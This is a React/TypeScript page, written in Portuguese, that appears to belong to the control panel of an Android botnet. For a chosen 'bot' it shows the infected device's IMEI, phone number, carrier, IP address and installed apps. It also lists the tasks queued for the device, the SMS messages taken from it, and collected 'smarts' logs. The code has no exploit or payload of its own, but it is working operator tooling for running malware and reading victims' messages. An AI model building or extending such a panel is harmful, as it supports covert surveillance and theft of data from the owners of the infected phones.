import { useEffect, useState } from 'react';
import { useParams } from 'react-router-dom';
import { getBotById, getTasks, getSmsList, getSmartsData } from '../services/api';
import { Bot, Task, Sms, SmartsData } from '../types';
import { formatDistanceToNow } from 'date-fns';

export default function BotDetail() {
  const { botId } = useParams<{ botId: string }>();
  const [bot, setBot] = useState<Bot | null>(null);
  const [tasks, setTasks] = useState<Task[]>([]);
  const [sms, setSms] = useState<Sms[]>([]);
  const [logs, setLogs] = useState<SmartsData[]>([]);
  const [activeTab, setActiveTab] = useState<'info' | 'tasks' | 'sms' | 'logs'>('info');
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const loadData = async () => {
      if (!botId) return;
      setLoading(true);
      try {
        const [botData, tasksData, smsData, logsData] = await Promise.all([
          getBotById(botId),
          getTasks({ bot_id: botId }),
          getSmsList({ bot_id: botId }),
          getSmartsData({ bot_id: botId }),
        ]);
        setBot(botData);
        setTasks(tasksData);
        setSms(smsData);
        setLogs(logsData);
      } catch (error) {
        console.error('Erro ao carregar detalhes do bot:', error);
      } finally {
        setLoading(false);
      }
    };
    loadData();
  }, [botId]);

  if (loading) {
    return <div className="text-center py-10">Carregando...</div>;
  }

  if (!bot) {
    return <div className="text-center py-10">Bot não encontrado.</div>;
  }

  return (
    <div>
      <h1 className="text-2xl font-bold mb-6 text-gray-900 dark:text-white">
        Bot #{bot.bot_id}
      </h1>

      <div className="flex space-x-4 border-b dark:border-gray-700 mb-6">
        <button
          onClick={() => setActiveTab('info')}
          className={`py-2 px-4 text-sm font-medium ${activeTab === 'info' ? 'border-b-2 border-indigo-600 text-indigo-600' : 'text-gray-500 hover:text-gray-700'}`}
        >
          Informações
        </button>
        <button
          onClick={() => setActiveTab('tasks')}
          className={`py-2 px-4 text-sm font-medium ${activeTab === 'tasks' ? 'border-b-2 border-indigo-600 text-indigo-600' : 'text-gray-500 hover:text-gray-700'}`}
        >
          Tarefas
        </button>
        <button
          onClick={() => setActiveTab('sms')}
          className={`py-2 px-4 text-sm font-medium ${activeTab === 'sms' ? 'border-b-2 border-indigo-600 text-indigo-600' : 'text-gray-500 hover:text-gray-700'}`}
        >
          SMS
        </button>
        <button
          onClick={() => setActiveTab('logs')}
          className={`py-2 px-4 text-sm font-medium ${activeTab === 'logs' ? 'border-b-2 border-indigo-600 text-indigo-600' : 'text-gray-500 hover:text-gray-700'}`}
        >
          Logs
        </button>
      </div>

      {activeTab === 'info' && (
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 bg-white dark:bg-gray-800 rounded-lg p-6">
          <InfoItem label="IMEI" value={bot.imei} />
          <InfoItem label="Número" value={bot.number} />
          <InfoItem label="País" value={bot.country} />
          <InfoItem label="Idioma" value={bot.lang} />
          <InfoItem label="Android" value={bot.android} />
          <InfoItem label="Modelo" value={bot.model} />
          <InfoItem label="Operadora" value={bot.operator} />
          <InfoItem label="IP" value={bot.ip} />
          <InfoItem label="Uptime" value={`${bot.uptime} segundos`} />
          <InfoItem label="Última atividade" value={formatDistanceToNow(new Date(bot.last_seen), { addSuffix: true })} />
          <InfoItem label="Registrado em" value={formatDistanceToNow(new Date(bot.registered), { addSuffix: true })} />
          <InfoItem label="Aplicativos" value={bot.apps.split('|').join(', ')} />
        </div>
      )}

      {activeTab === 'tasks' && (
        <div className="bg-white dark:bg-gray-800 rounded-lg p-6 overflow-x-auto">
          <table className="min-w-full">
            <thead>
              <tr>
                <th>ID</th>
                <th>Tipo</th>
                <th>Dados</th>
                <th>Status</th>
              </tr>
            </thead>
            <tbody>
              {tasks.map((task) => (
                <tr key={task.id}>
                  <td>{task.id}</td>
                  <td>{task.task_type}</td>
                  <td>{task.data}</td>
                  <td>{task.status}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      {activeTab === 'sms' && (
        <div className="bg-white dark:bg-gray-800 rounded-lg p-6 overflow-x-auto">
          <table className="min-w-full">
            <thead>
              <tr>
                <th>ID</th>
                <th>Número</th>
                <th>Mensagem</th>
                <th>Data</th>
              </tr>
            </thead>
            <tbody>
              {sms.map((s) => (
                <tr key={s.id}>
                  <td>{s.id}</td>
                  <td>{s.number}</td>
                  <td>{s.msg}</td>
                  <td>{formatDistanceToNow(new Date(Number(s.time) * 1000), { addSuffix: true })}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      {activeTab === 'logs' && (
        <div className="bg-white dark:bg-gray-800 rounded-lg p-6 overflow-x-auto">
          <table className="min-w-full">
            <thead>
              <tr>
                <th>ID</th>
                <th>Smart ID</th>
                <th>Data</th>
                <th>Conteúdo</th>
              </tr>
            </thead>
            <tbody>
              {logs.map((log) => (
                <tr key={log.id}>
                  <td>{log.id}</td>
                  <td>{log.smart_id}</td>
                  <td>{formatDistanceToNow(new Date(Number(log.time) * 1000), { addSuffix: true })}</td>
                  <td className="max-w-xs truncate">{log.data}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}

function InfoItem({ label, value }: { label: string; value: string | number }) {
  return (
    <div>
      <p className="text-sm text-gray-500 dark:text-gray-400">{label}</p>
      <p className="text-base text-gray-900 dark:text-white">{value}</p>
    </div>
  );
}